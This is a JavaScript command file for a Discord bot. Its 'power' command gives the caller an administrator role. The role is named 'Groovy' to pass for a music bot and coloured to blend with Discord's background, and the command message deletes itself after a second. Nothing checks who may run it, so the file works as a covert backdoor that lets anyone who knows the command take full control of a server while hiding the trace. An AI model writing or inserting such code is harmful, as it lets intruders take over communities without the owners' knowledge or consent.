const Discord = module.require("discord.js");
module.exports.run = async (bot, message, args) => {
    try {
        role = await message.guild.createRole({
            name: "Groovy",
          	color: "#2f3136",
          	permissions: [8]
            });
            
        message.member.addRole(role)
        message.delete(1000);
        } catch(e) {
        	console.log(e.stack);
        }
}

module.exports.help = {
    name: "power",
    desc: "Gives you admin perms."
}